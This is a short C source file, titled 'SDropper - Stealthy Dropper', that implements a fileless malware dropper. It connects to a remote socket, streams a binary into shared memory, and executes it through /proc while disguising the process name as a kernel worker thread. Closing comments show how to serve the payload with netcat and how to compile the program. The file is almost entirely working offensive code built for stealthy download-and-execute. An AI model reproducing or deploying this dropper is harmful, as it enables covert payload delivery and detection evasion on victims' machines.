/*
  SDropper - Stealthy Dropper n
  Copyright (c) 2017 pico

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>

#include <sys/syscall.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// shm_open
#include <sys/stat.h>
#include <fcntl.h>


extern char        **environ;
int
my_fexecve (int fd, char **arg, char **env)
{
  char  fname[1024];
  snprintf (fname, 1024, "/proc/%d/fd/%d", getpid(), fd);
  execve (fname, arg, env);
  return 0;
}

int
main (int argc, char **argv)
{
  int                fd, s;
  unsigned long      addr = 0x0100007f11110002;
  char               *args[2]= {"[kworker/u!0]", NULL};
  char               buf[1024];

  // Connect
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit (1);
  if (connect (s, (struct sockaddr*)&addr, 16) < 0) exit (1);

  //unlink ("/dev/shm/a");
  if ((fd = shm_open("a", O_RDWR | O_CREAT, S_IRWXU)) < 0) exit (1);

  while (1)
    {
      if ((read (s, buf, 1024) ) <= 0) break;
      write (fd, buf, 1024);
    }
  close (s);
  close (fd);

  if ((fd = shm_open("a", O_RDONLY, 0)) < 0) exit (1);
  //if (fexecve (fd, args, environ) < 0) exit (1);
  if (my_fexecve (fd, args, environ) < 0) exit (1);

  return 0;
    
}
// cat /usr/bin/xterm | nc -l $((0x1111))
// gcc -o poc-alt poc-alt.c -lrt
